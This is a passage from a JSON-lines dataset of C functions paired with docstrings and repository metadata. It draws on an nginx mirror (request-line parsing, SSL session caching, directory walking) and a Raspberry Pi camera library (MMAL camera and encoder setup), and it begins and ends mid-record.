break;\n            case LF:\n                r->uri_end = p;\n                r->http_minor = 9;\n                goto done;\n            case '#':\n                r->complex_uri = 1;\n                break;\n            case '\\0':\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n            break;\n\n        /* space+ after URI */\n        case sw_http_09:\n            switch (ch) {\n            case ' ':\n                break;\n            case CR:\n                r->http_minor = 9;\n                state = sw_almost_done;\n                break;\n            case LF:\n                r->http_minor = 9;\n                goto done;\n            case 'H':\n                r->http_protocol.data = p;\n                state = sw_http_H;\n                break;\n            default:\n                r->space_in_uri = 1;\n                state = sw_uri;\n                p--;\n                break;\n            }\n            break;\n\n        case sw_http_H:\n            switch (ch) {\n            case 'T':\n                state = sw_http_HT;\n                break;\n            default:\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n            break;\n\n        case sw_http_HT:\n            switch (ch) {\n            case 'T':\n                state = sw_http_HTT;\n                break;\n            default:\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n            break;\n\n        case sw_http_HTT:\n            switch (ch) {\n            case 'P':\n                state = sw_http_HTTP;\n                break;\n            default:\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n            break;\n\n        case sw_http_HTTP:\n            switch (ch) {\n            case '/':\n                state = sw_first_major_digit;\n                break;\n            default:\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n            break;\n\n        /* first digit of major HTTP version */\n        case sw_first_major_digit:\n            if (ch < '1' || ch > '9') {\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n\n            r->http_major = ch - '0';\n            state = sw_major_digit;\n            break;\n\n        /* major HTTP version or dot */\n        case sw_major_digit:\n            if (ch == '.') {\n                state = sw_first_minor_digit;\n                break;\n            }\n\n            if (ch < '0' || ch > '9') {\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n\n            r->http_major = r->http_major * 10 + ch - '0';\n            break;\n\n        /* first digit of minor HTTP version */\n        case sw_first_minor_digit:\n            if (ch < '0' || ch > '9') {\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n\n            r->http_minor = ch - '0';\n            state = sw_minor_digit;\n            break;\n\n        /* minor HTTP version or end of request line */\n        case sw_minor_digit:\n            if (ch == CR) {\n                state = sw_almost_done;\n                break;\n            }\n\n            if (ch == LF) {\n                goto done;\n            }\n\n            if (ch == ' ') {\n                state = sw_spaces_after_digit;\n                break;\n            }\n\n            if (ch < '0' || ch > '9') {\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n\n            r->http_minor = r->http_minor * 10 + ch - '0';\n            break;\n\n        case sw_spaces_after_digit:\n            switch (ch) {\n            case ' ':\n                break;\n            case CR:\n                state = sw_almost_done;\n                break;\n            case LF:\n                goto done;\n            default:\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n            break;\n\n        /* end of request line */\n        case sw_almost_done:\n            r->request_end = p - 1;\n            switch (ch) {\n            case LF:\n                goto done;\n            default:\n                return NGX_HTTP_PARSE_INVALID_REQUEST;\n            }\n        }\n    }\n\n    b->pos = p;\n    r->state = state;\n\n    return NGX_AGAIN;\n\ndone:\n\n    b->pos = p + 1;\n\n    if (r->request_end == NULL) {\n        r->request_end = p;\n    }\n\n    r->http_version = r->http_major * 1000 + r->http_minor;\n    r->state = sw_start;\n\n    if (r->http_version == 9 && r->method != NGX_HTTP_GET) {\n        return NGX_HTTP_PARSE_INVALID_09_METHOD;\n    }\n\n    return NGX_OK;\n}", "path": "nginx\\http\\ngx_http_parse.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/*\n * The length of the session id is 16 bytes for SSLv2 sessions and\n * between 1 and 32 bytes for SSLv3/TLSv1, typically 32 bytes.\n * It seems that the typical length of the external ASN1 representation\n * of a session is 118 or 119 bytes for SSLv3/TSLv1.\n *\n * Thus on 32-bit platforms we allocate separately an rbtree node,\n * a session id, and an ASN1 representation, they take accordingly\n * 64, 32, and 128 bytes.\n *\n * On 64-bit platforms we allocate separately an rbtree node + session_id,\n * and an ASN1 representation, they take accordingly 128 and 128 bytes.\n *\n * OpenSSL's i2d_SSL_SESSION() and d2i_SSL_SESSION are slow,\n * so they are outside the code locked by shared pool mutex\n */\n", "func_signal": "static int\nngx_ssl_new_session(ngx_ssl_conn_t *ssl_conn, ngx_ssl_session_t *sess)", "code": "{\n    int                       len;\n    u_char                   *p, *id, *cached_sess, *session_id;\n    uint32_t                  hash;\n    SSL_CTX                  *ssl_ctx;\n    unsigned int              session_id_length;\n    ngx_shm_zone_t           *shm_zone;\n    ngx_connection_t         *c;\n    ngx_slab_pool_t          *shpool;\n    ngx_ssl_sess_id_t        *sess_id;\n    ngx_ssl_session_cache_t  *cache;\n    u_char                    buf[NGX_SSL_MAX_SESSION_SIZE];\n\n    len = i2d_SSL_SESSION(sess, NULL);\n\n    /* do not cache too big session */\n\n    if (len > (int) NGX_SSL_MAX_SESSION_SIZE) {\n        return 0;\n    }\n\n    p = buf;\n    i2d_SSL_SESSION(sess, &p);\n\n    c = ngx_ssl_get_connection(ssl_conn);\n\n    ssl_ctx = c->ssl->session_ctx;\n    shm_zone = SSL_CTX_get_ex_data(ssl_ctx, ngx_ssl_session_cache_index);\n\n    cache = shm_zone->data;\n    shpool = (ngx_slab_pool_t *) shm_zone->shm.addr;\n\n    ngx_shmtx_lock(&shpool->mutex);\n\n    /* drop one or two expired sessions */\n    ngx_ssl_expire_sessions(cache, shpool, 1);\n\n    cached_sess = ngx_slab_alloc_locked(shpool, len);\n\n    if (cached_sess == NULL) {\n\n        /* drop the oldest non-expired session and try once more */\n\n        ngx_ssl_expire_sessions(cache, shpool, 0);\n\n        cached_sess = ngx_slab_alloc_locked(shpool, len);\n\n        if (cached_sess == NULL) {\n            sess_id = NULL;\n            goto failed;\n        }\n    }\n\n    sess_id = ngx_slab_alloc_locked(shpool, sizeof(ngx_ssl_sess_id_t));\n\n    if (sess_id == NULL) {\n\n        /* drop the oldest non-expired session and try once more */\n\n        ngx_ssl_expire_sessions(cache, shpool, 0);\n\n        sess_id = ngx_slab_alloc_locked(shpool, sizeof(ngx_ssl_sess_id_t));\n\n        if (sess_id == NULL) {\n            goto failed;\n        }\n    }\n\n#if OPENSSL_VERSION_NUMBER >= 0x0090800fL\n\n    session_id = (u_char *) SSL_SESSION_get_id(sess, &session_id_length);\n\n#else\n\n    session_id = sess->session_id;\n    session_id_length = sess->session_id_length;\n\n#endif\n\n#if (NGX_PTR_SIZE == 8)\n\n    id = sess_id->sess_id;\n\n#else\n\n    id = ngx_slab_alloc_locked(shpool, session_id_length);\n\n    if (id == NULL) {\n\n        /* drop the oldest non-expired session and try once more */\n\n        ngx_ssl_expire_sessions(cache, shpool, 0);\n\n        id = ngx_slab_alloc_locked(shpool, session_id_length);\n\n        if (id == NULL) {\n            goto failed;\n        }\n    }\n\n#endif\n\n    ngx_memcpy(cached_sess, buf, len);\n\n    ngx_memcpy(id, session_id, session_id_length);\n\n    hash = ngx_crc32_short(session_id, session_id_length);\n\n    ngx_log_debug3(NGX_LOG_DEBUG_EVENT, c->log, 0,\n                   \"ssl new session: %08XD:%ud:%d\",\n                   hash, session_id_length, len);\n\n    sess_id->node.key = hash;\n    sess_id->node.data = (u_char) session_id_length;\n    sess_id->id = id;\n    sess_id->len = len;\n    sess_id->session = cached_sess;\n\n    sess_id->expire = ngx_time() + SSL_CTX_get_timeout(ssl_ctx);\n\n    ngx_queue_insert_head(&cache->expire_queue, &sess_id->queue);\n\n    ngx_rbtree_insert(&cache->session_rbtree, &sess_id->node);\n\n    ngx_shmtx_unlock(&shpool->mutex);\n\n    return 0;\n\nfailed:\n\n    if (cached_sess) {\n        ngx_slab_free_locked(shpool, cached_sess);\n    }\n\n    if (sess_id) {\n        ngx_slab_free_locked(shpool, sess_id);\n    }\n\n    ngx_shmtx_unlock(&shpool->mutex);\n\n    ngx_log_error(NGX_LOG_ALERT, c->log, 0,\n                  \"could not allocate new session%s\", shpool->log_ctx);\n\n    return 0;\n}", "path": "nginx\\event\\ngx_event_openssl.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/*\n * ctx->init_handler() - see ctx->alloc\n * ctx->file_handler() - file handler\n * ctx->pre_tree_handler() - handler is called before entering directory\n * ctx->post_tree_handler() - handler is called after leaving directory\n * ctx->spec_handler() - special (socket, FIFO, etc.) file handler\n *\n * ctx->data - some data structure, it may be the same on all levels, or\n *     reallocated if ctx->alloc is nonzero\n *\n * ctx->alloc - a size of data structure that is allocated at every level\n *     and is initialized by ctx->init_handler()\n *\n * ctx->log - a log\n *\n * on fatal (memory) error handler must return NGX_ABORT to stop walking tree\n */\n", "func_signal": "ngx_int_t\nngx_walk_tree(ngx_tree_ctx_t *ctx, ngx_str_t *tree)", "code": "{\n    void       *data, *prev;\n    u_char     *p, *name;\n    size_t      len;\n    ngx_int_t   rc;\n    ngx_err_t   err;\n    ngx_str_t   file, buf;\n    ngx_dir_t   dir;\n\n    ngx_str_null(&buf);\n\n    ngx_log_debug1(NGX_LOG_DEBUG_CORE, ctx->log, 0,\n                   \"walk tree \\\"%V\\\"\", tree);\n\n    if (ngx_open_dir(tree, &dir) == NGX_ERROR) {\n        ngx_log_error(NGX_LOG_CRIT, ctx->log, ngx_errno,\n                      ngx_open_dir_n \" \\\"%s\\\" failed\", tree->data);\n        return NGX_ERROR;\n    }\n\n    prev = ctx->data;\n\n    if (ctx->alloc) {\n        data = ngx_alloc(ctx->alloc, ctx->log);\n        if (data == NULL) {\n            goto failed;\n        }\n\n        if (ctx->init_handler(data, prev) == NGX_ABORT) {\n            goto failed;\n        }\n\n        ctx->data = data;\n\n    } else {\n        data = NULL;\n    }\n\n    for ( ;; ) {\n\n        ngx_set_errno(0);\n\n        if (ngx_read_dir(&dir) == NGX_ERROR) {\n            err = ngx_errno;\n\n            if (err == NGX_ENOMOREFILES) {\n                rc = NGX_OK;\n\n            } else {\n                ngx_log_error(NGX_LOG_CRIT, ctx->log, err,\n                              ngx_read_dir_n \" \\\"%s\\\" failed\", tree->data);\n                rc = NGX_ERROR;\n            }\n\n            goto done;\n        }\n\n        len = ngx_de_namelen(&dir);\n        name = ngx_de_name(&dir);\n\n        ngx_log_debug2(NGX_LOG_DEBUG_CORE, ctx->log, 0,\n                      \"tree name %uz:\\\"%s\\\"\", len, name);\n\n        if (len == 1 && name[0] == '.') {\n            continue;\n        }\n\n        if (len == 2 && name[0] == '.' && name[1] == '.') {\n            continue;\n        }\n\n        file.len = tree->len + 1 + len;\n\n        if (file.len + NGX_DIR_MASK_LEN > buf.len) {\n\n            if (buf.len) {\n                ngx_free(buf.data);\n            }\n\n            buf.len = tree->len + 1 + len + NGX_DIR_MASK_LEN;\n\n            buf.data = ngx_alloc(buf.len + 1, ctx->log);\n            if (buf.data == NULL) {\n                goto failed;\n            }\n        }\n\n        p = ngx_cpymem(buf.data, tree->data, tree->len);\n        *p++ = '/';\n        ngx_memcpy(p, name, len + 1);\n\n        file.data = buf.data;\n\n        ngx_log_debug1(NGX_LOG_DEBUG_CORE, ctx->log, 0,\n                       \"tree path \\\"%s\\\"\", file.data);\n\n        if (!dir.valid_info) {\n            if (ngx_de_info(file.data, &dir) == NGX_FILE_ERROR) {\n                ngx_log_error(NGX_LOG_CRIT, ctx->log, ngx_errno,\n                              ngx_de_info_n \" \\\"%s\\\" failed\", file.data);\n                continue;\n            }\n        }\n\n        if (ngx_de_is_file(&dir)) {\n\n            ngx_log_debug1(NGX_LOG_DEBUG_CORE, ctx->log, 0,\n                           \"tree file \\\"%s\\\"\", file.data);\n\n            ctx->size = ngx_de_size(&dir);\n            ctx->fs_size = ngx_de_fs_size(&dir);\n            ctx->access = ngx_de_access(&dir);\n            ctx->mtime = ngx_de_mtime(&dir);\n\n            if (ctx->file_handler(ctx, &file) == NGX_ABORT) {\n                goto failed;\n            }\n\n        } else if (ngx_de_is_dir(&dir)) {\n\n            ngx_log_debug1(NGX_LOG_DEBUG_CORE, ctx->log, 0,\n                           \"tree enter dir \\\"%s\\\"\", file.data);\n\n            ctx->access = ngx_de_access(&dir);\n            ctx->mtime = ngx_de_mtime(&dir);\n\n            rc = ctx->pre_tree_handler(ctx, &file);\n\n            if (rc == NGX_ABORT) {\n                goto failed;\n            }\n\n            if (rc == NGX_DECLINED) {\n                ngx_log_debug1(NGX_LOG_DEBUG_CORE, ctx->log, 0,\n                               \"tree skip dir \\\"%s\\\"\", file.data);\n                continue;\n            }\n\n            if (ngx_walk_tree(ctx, &file) == NGX_ABORT) {\n                goto failed;\n            }\n\n            ctx->access = ngx_de_access(&dir);\n            ctx->mtime = ngx_de_mtime(&dir);\n\n            if (ctx->post_tree_handler(ctx, &file) == NGX_ABORT) {\n                goto failed;\n            }\n\n        } else {\n\n            ngx_log_debug1(NGX_LOG_DEBUG_CORE, ctx->log, 0,\n                           \"tree special \\\"%s\\\"\", file.data);\n\n            if (ctx->spec_handler(ctx, &file) == NGX_ABORT) {\n                goto failed;\n            }\n        }\n    }\n\nfailed:\n\n    rc = NGX_ABORT;\n\ndone:\n\n    if (buf.len) {\n        ngx_free(buf.data);\n    }\n\n    if (data) {\n        ngx_free(data);\n        ctx->data = prev;\n    }\n\n    if (ngx_close_dir(&dir) == NGX_ERROR) {\n        ngx_log_error(NGX_LOG_CRIT, ctx->log, ngx_errno,\n                      ngx_close_dir_n \" \\\"%s\\\" failed\", tree->data);\n    }\n\n    return rc;\n}", "path": "nginx\\core\\ngx_file.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/*\n * ngx_strlcasestrn() is intended to search for static substring\n * with known length in string until the argument last. The argument n\n * must be length of the second substring - 1.\n */\n", "func_signal": "u_char *\nngx_strlcasestrn(u_char *s1, u_char *last, u_char *s2, size_t n)", "code": "{\n    ngx_uint_t  c1, c2;\n\n    c2 = (ngx_uint_t) *s2++;\n    c2 = (c2 >= 'A' && c2 <= 'Z') ? (c2 | 0x20) : c2;\n    last -= n;\n\n    do {\n        do {\n            if (s1 >= last) {\n                return NULL;\n            }\n\n            c1 = (ngx_uint_t) *s1++;\n\n            c1 = (c1 >= 'A' && c1 <= 'Z') ? (c1 | 0x20) : c1;\n\n        } while (c1 != c2);\n\n    } while (ngx_strncasecmp(s1, s2, n) != 0);\n\n    return --s1;\n}", "path": "nginx\\core\\ngx_string.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/*\n * find the middle queue element if the queue has odd number of elements\n * or the first element of the queue's second part otherwise\n */\n", "func_signal": "ngx_queue_t *\nngx_queue_middle(ngx_queue_t *queue)", "code": "{\n    ngx_queue_t  *middle, *next;\n\n    middle = ngx_queue_head(queue);\n\n    if (middle == ngx_queue_last(queue)) {\n        return middle;\n    }\n\n    next = ngx_queue_head(queue);\n\n    for ( ;; ) {\n        middle = ngx_queue_next(middle);\n\n        next = ngx_queue_next(next);\n\n        if (next == ngx_queue_last(queue)) {\n            return middle;\n        }\n\n        next = ngx_queue_next(next);\n\n        if (next == ngx_queue_last(queue)) {\n            return middle;\n        }\n    }\n}", "path": "nginx\\core\\ngx_queue.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/* auto detect the L2 cache line size of modern and widespread CPUs */\n", "func_signal": "void\nngx_cpuinfo(void)", "code": "{\n    u_char    *vendor;\n    uint32_t   vbuf[5], cpu[4], model;\n\n    vbuf[0] = 0;\n    vbuf[1] = 0;\n    vbuf[2] = 0;\n    vbuf[3] = 0;\n    vbuf[4] = 0;\n\n    ngx_cpuid(0, vbuf);\n\n    vendor = (u_char *) &vbuf[1];\n\n    if (vbuf[0] == 0) {\n        return;\n    }\n\n    ngx_cpuid(1, cpu);\n\n    if (ngx_strcmp(vendor, \"GenuineIntel\") == 0) {\n\n        switch ((cpu[0] & 0xf00) >> 8) {\n\n        /* Pentium */\n        case 5:\n            ngx_cacheline_size = 32;\n            break;\n\n        /* Pentium Pro, II, III */\n        case 6:\n            ngx_cacheline_size = 32;\n\n            model = ((cpu[0] & 0xf0000) >> 8) | (cpu[0] & 0xf0);\n\n            if (model >= 0xd0) {\n                /* Intel Core, Core 2, Atom */\n                ngx_cacheline_size = 64;\n            }\n\n            break;\n\n        /*\n         * Pentium 4, although its cache line size is 64 bytes,\n         * it prefetches up to two cache lines during memory read\n         */\n        case 15:\n            ngx_cacheline_size = 128;\n            break;\n        }\n\n    } else if (ngx_strcmp(vendor, \"AuthenticAMD\") == 0) {\n        ngx_cacheline_size = 64;\n    }\n}", "path": "nginx\\core\\ngx_cpuinfo.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/* add the server core module configuration to the address:port */\n", "func_signal": "static ngx_int_t\nngx_http_add_server(ngx_conf_t *cf, ngx_http_core_srv_conf_t *cscf,\n    ngx_http_conf_addr_t *addr)", "code": "{\n    ngx_uint_t                  i;\n    ngx_http_core_srv_conf_t  **server;\n\n    if (addr->servers.elts == NULL) {\n        if (ngx_array_init(&addr->servers, cf->temp_pool, 4,\n                           sizeof(ngx_http_core_srv_conf_t *))\n            != NGX_OK)\n        {\n            return NGX_ERROR;\n        }\n\n    } else {\n        server = addr->servers.elts;\n        for (i = 0; i < addr->servers.nelts; i++) {\n            if (server[i] == cscf) {\n                ngx_conf_log_error(NGX_LOG_EMERG, cf, 0,\n                                   \"a duplicate listen %s\", addr->opt.addr);\n                return NGX_ERROR;\n            }\n        }\n    }\n\n    server = ngx_array_push(&addr->servers);\n    if (server == NULL) {\n        return NGX_ERROR;\n    }\n\n    *server = cscf;\n\n    return NGX_OK;\n}", "path": "nginx\\http\\ngx_http.c", "repo_name": "purecpp-org/nginx_vs", "stars": 108, "license": "None", "language": "c", "size": 5273}
{"docstring": "/**\n * Convert string to the MMAL parameter for image effects mode\n * @param str Incoming string to match\n * @return MMAL parameter matching the strong, or the AUTO option if no match found\n */\n", "func_signal": "MMAL_PARAM_IMAGEFX_T imagefx_mode_from_string(const char *str)", "code": "{\n   int i = map_xref(str, imagefx_map, imagefx_map_size);\n\n   if( i != -1)\n     return (MMAL_PARAM_IMAGEFX_T)i;\n\n   vcos_log_error(\"Unknown image fx: %s\", str);\n   return MMAL_PARAM_IMAGEFX_NONE;\n}", "path": "src\\RaspiCamControl.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Assign a default set of parameters to the state passed in\n *\n * @param state Pointer to state structure to assign defaults to\n */\n", "func_signal": "static void default_status(RASPISTILL_STATE *state)", "code": "{\n   if (!state) {\n      vcos_assert(0);\n      return;\n   }   \n   state->width = 2592;\n   state->height = 1944;\n   state->quality = 85;   \n   state->bytesStored = 0l;\n   /*Video*/\n                    \n   state->bitrate = 17000000;\n   state->framerate = VIDEO_FRAME_RATE_NUM;\n   state->immutableInput = 0;\n   state->intraperiod = 0;    // Not set\n   state->quantisationParameter = 0;\n   state->inlineHeaders = 0;\n   state->profile = MMAL_VIDEO_PROFILE_H264_HIGH;\n\n   state->camera_component = NULL;\n   state->encoder_component = NULL;   \n   state->encoder_connection = NULL;\n   state->encoder_pool = NULL;\n   state->encoding = MMAL_ENCODING_JPEG; //MMAL_ENCODING_BMP  \n   raspicamcontrol_set_defaults(&state->camera_parameters);\n   //state->camera_parameters.exposureMode = MMAL_PARAM_EXPOSUREMODE_NIGHT;\n   //state->camera_parameters.exposureMeterMode = MMAL_PARAM_EXPOSUREMETERINGMODE_AVERAGE;\n}", "path": "src\\picam.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Destroy the encoder component\n *\n * @param state Pointer to state control struct\n *\n */\n", "func_signal": "static void destroy_encoder_component(RASPISTILL_STATE *state)", "code": "{\n   // Get rid of any port buffers first\n   if (state->encoder_pool) {\n      mmal_port_pool_destroy(state->encoder_component->output[0], state->encoder_pool);\n   }\n\n   if (state->encoder_component) {\n      mmal_component_destroy(state->encoder_component);\n      state->encoder_component = NULL;\n   }\n}", "path": "src\\picam.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Asked GPU how much memory it has allocated\n *\n * @return amount of memory in MB\n */\n", "func_signal": "static int raspicamcontrol_get_mem_gpu(void)", "code": "{\n   char response[80] = \"\";\n   int gpu_mem = 0;\n   if (vc_gencmd(response, sizeof response, \"get_mem gpu\") == 0)\n      vc_gencmd_number_property(response, \"gpu\", &gpu_mem);\n   return gpu_mem;\n}", "path": "src\\RaspiCamControl.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Connect two specific ports together\n *\n * @param output_port Pointer the output port\n * @param input_port Pointer the input port\n * @param Pointer to a mmal connection pointer, reassigned if function successful\n * @return Returns a MMAL_STATUS_T giving result of operation\n *\n */\n", "func_signal": "static MMAL_STATUS_T connect_ports(MMAL_PORT_T *output_port, MMAL_PORT_T *input_port, MMAL_CONNECTION_T **connection)", "code": "{\n   MMAL_STATUS_T status;\n\n   status =  mmal_connection_create(connection, output_port, input_port, MMAL_CONNECTION_FLAG_TUNNELLING | MMAL_CONNECTION_FLAG_ALLOCATION_ON_INPUT);\n\n   if (status == MMAL_SUCCESS) {\n      status =  mmal_connection_enable(*connection);\n      if (status != MMAL_SUCCESS)\n         mmal_connection_destroy(*connection);\n   }\n\n   return status;\n}", "path": "src\\picam.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Set the aWB (auto white balance) mode for images\n * @param camera Pointer to camera component\n * @param awb_mode Value to set from\n *   - MMAL_PARAM_AWBMODE_OFF,\n *   - MMAL_PARAM_AWBMODE_AUTO,\n *   - MMAL_PARAM_AWBMODE_SUNLIGHT,\n *   - MMAL_PARAM_AWBMODE_CLOUDY,\n *   - MMAL_PARAM_AWBMODE_SHADE,\n *   - MMAL_PARAM_AWBMODE_TUNGSTEN,\n *   - MMAL_PARAM_AWBMODE_FLUORESCENT,\n *   - MMAL_PARAM_AWBMODE_INCANDESCENT,\n *   - MMAL_PARAM_AWBMODE_FLASH,\n *   - MMAL_PARAM_AWBMODE_HORIZON,\n * @return 0 if successful, non-zero if any parameters out of range\n */\n", "func_signal": "int raspicamcontrol_set_awb_mode(MMAL_COMPONENT_T *camera, MMAL_PARAM_AWBMODE_T awb_mode)", "code": "{\n   MMAL_PARAMETER_AWBMODE_T param = {{MMAL_PARAMETER_AWB_MODE,sizeof(param)}, awb_mode};\n\n   if (!camera)\n      return 1;\n\n   return mmal_status_to_int(mmal_port_parameter_set(camera->control, &param.hdr));\n}", "path": "src\\RaspiCamControl.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Set the ROI of the sensor to use for captures/preview\n * @param camera Pointer to camera component\n * @param rect   Normalised coordinates of ROI rectangle\n *\n * @return 0 if successful, non-zero if any parameters out of range\n */\n", "func_signal": "int raspicamcontrol_set_ROI(MMAL_COMPONENT_T *camera, PARAM_FLOAT_RECT_T rect)", "code": "{\n   MMAL_PARAMETER_INPUT_CROP_T crop = {{MMAL_PARAMETER_INPUT_CROP, sizeof(MMAL_PARAMETER_INPUT_CROP_T)}};\n\n   crop.rect.x = (65536 * rect.x);\n   crop.rect.y = (65536 * rect.y);\n   crop.rect.width = (65536 * rect.w);\n   crop.rect.height = (65536 * rect.h);\n\n   return mmal_port_parameter_set(camera->control, &crop.hdr);\n}", "path": "src\\RaspiCamControl.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Adjust the brightness level for images\n * @param camera Pointer to camera component\n * @param brightness Value to adjust, 0 to 100\n * @return 0 if successful, non-zero if any parameters out of range\n */\n", "func_signal": "int raspicamcontrol_set_brightness(MMAL_COMPONENT_T *camera, int brightness)", "code": "{\n   int ret = 0;\n\n   if (!camera)\n      return 1;\n\n   if (brightness >= 0 && brightness <= 100)\n   {\n      MMAL_RATIONAL_T value = {brightness, 100};\n      ret = mmal_status_to_int(mmal_port_parameter_set_rational(camera->control, MMAL_PARAMETER_BRIGHTNESS, value));\n   }\n   else\n   {\n      vcos_log_error(\"Invalid brightness value\");\n      ret = 1;\n   }\n\n   return ret;\n}", "path": "src\\RaspiCamControl.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Get all the current camera parameters from specified camera component\n * @param camera Pointer to camera component\n * @param params Pointer to parameter block to accept settings\n * @return 0 if successful, non-zero if unsuccessful\n */\n", "func_signal": "int raspicamcontrol_get_all_parameters(MMAL_COMPONENT_T *camera, RASPICAM_CAMERA_PARAMETERS *params)", "code": "{\n   vcos_assert(camera);\n   vcos_assert(params);\n\n   if (!camera || !params)\n      return 1;\n\n/* TODO : Write these get functions\n   params->sharpness = raspicamcontrol_get_sharpness(camera);\n   params->contrast = raspicamcontrol_get_contrast(camera);\n   params->brightness = raspicamcontrol_get_brightness(camera);\n   params->saturation = raspicamcontrol_get_saturation(camera);\n   params->ISO = raspicamcontrol_get_ISO(camera);\n   params->videoStabilisation = raspicamcontrol_get_video_stabilisation(camera);\n   params->exposureCompensation = raspicamcontrol_get_exposure_compensation(camera);\n   params->exposureMode = raspicamcontrol_get_exposure_mode(camera);\n   params->awbMode = raspicamcontrol_get_awb_mode(camera);\n   params->imageEffect = raspicamcontrol_get_image_effect(camera);\n   params->colourEffects = raspicamcontrol_get_colour_effect(camera);\n   params->thumbnailConfig = raspicamcontrol_get_thumbnail_config(camera);\n*/\n   return 0;\n}", "path": "src\\RaspiCamControl.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Checks if specified port is valid and enabled, then disables it\n *\n * @param port  Pointer the port\n *\n */\n", "func_signal": "static void check_disable_port(MMAL_PORT_T *port)", "code": "{\n   if (port && port->is_enabled)\n      mmal_port_disable(port);\n}", "path": "src\\picam.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Create the camera component, set up its ports\n *\n * @param state Pointer to state control struct\n *\n * @return MMAL_SUCCESS if all OK, something else otherwise\n *\n */\n", "func_signal": "static MMAL_STATUS_T create_video_camera_component(RASPISTILL_STATE *state)", "code": "{\n   MMAL_COMPONENT_T *camera = 0;\n   MMAL_ES_FORMAT_T *format;\n   MMAL_PORT_T  *video_port = NULL, *still_port = NULL;\n   MMAL_STATUS_T status;\n\n   /* Create the component */\n   status = mmal_component_create(MMAL_COMPONENT_DEFAULT_CAMERA, &camera);\n\n   if (status != MMAL_SUCCESS) {\n      vcos_log_error(\"Failed to create camera component\");\n      goto error;\n   }\n\n   if (!camera->output_num) {\n      status = MMAL_ENOSYS;\n      vcos_log_error(\"Camera doesn't have output ports\");\n      goto error;\n   }\n\n   \n   video_port = camera->output[MMAL_CAMERA_VIDEO_PORT];\n   still_port = camera->output[MMAL_CAMERA_CAPTURE_PORT];\n\n   // Enable the camera, and tell it its control callback function\n   status = mmal_port_enable(camera->control, camera_control_callback);\n\n   if (status != MMAL_SUCCESS)  {\n      vcos_log_error(\"Unable to enable control port : error %d\", status);\n      goto error;\n   }\n\n   //  set up the camera configuration\n   \n   MMAL_PARAMETER_CAMERA_CONFIG_T cam_config =\n      {\n         { MMAL_PARAMETER_CAMERA_CONFIG, sizeof(cam_config) },\n         .max_stills_w = state->width,\n         .max_stills_h = state->height,\n         .stills_yuv422 = 0,\n         .one_shot_stills = 1,\n         .max_preview_video_w = 640,\n         .max_preview_video_h = 480,\n         .num_preview_video_frames = 3,\n         .stills_capture_circular_buffer_height = 0,\n         .fast_preview_resume = 0,\n         .use_stc_timestamp = MMAL_PARAM_TIMESTAMP_MODE_RESET_STC\n      };\n   mmal_port_parameter_set(camera->control, &cam_config.hdr);\n   \n   raspicamcontrol_set_all_parameters(camera, &state->camera_parameters);\n   // Now set up the port formats\n\n   // Set the encode format on the video  port\n\n   format = video_port->format;\n   format->encoding_variant = MMAL_ENCODING_I420;\n\n   format->encoding = MMAL_ENCODING_OPAQUE;\n   format->es->video.width = state->width;\n   format->es->video.height = state->height;\n   format->es->video.crop.x = 0;\n   format->es->video.crop.y = 0;\n   format->es->video.crop.width = state->width;\n   format->es->video.crop.height = state->height;\n   format->es->video.frame_rate.num = state->framerate;\n   format->es->video.frame_rate.den = VIDEO_FRAME_RATE_DEN;\n\n   status = mmal_port_format_commit(video_port);\n\n   if (status != MMAL_SUCCESS) {\n      vcos_log_error(\"camera video format couldn't be set\");\n      goto error;\n   }\n\n   // Ensure there are enough buffers to avoid dropping frames\n   if (video_port->buffer_num < VIDEO_OUTPUT_BUFFERS_NUM)\n      video_port->buffer_num = VIDEO_OUTPUT_BUFFERS_NUM;\n\n\n   // Set the encode format on the still  port\n\n   format = still_port->format;\n\n   format->encoding = MMAL_ENCODING_OPAQUE;\n   if (state->videoEncode == 1) {\n       format->encoding_variant = MMAL_ENCODING_I420;\n   }\n   format->es->video.width = state->width;\n   format->es->video.height = state->height;\n   format->es->video.crop.x = 0;\n   format->es->video.crop.y = 0;\n   format->es->video.crop.width = state->width;\n   format->es->video.crop.height = state->height;\n   format->es->video.frame_rate.num = STILLS_FRAME_RATE_NUM;\n   format->es->video.frame_rate.den = STILLS_FRAME_RATE_DEN;\n\n   status = mmal_port_format_commit(still_port);\n\n   if (status != MMAL_SUCCESS)\n   {\n      vcos_log_error(\"camera still format couldn't be set\");\n      goto error;\n 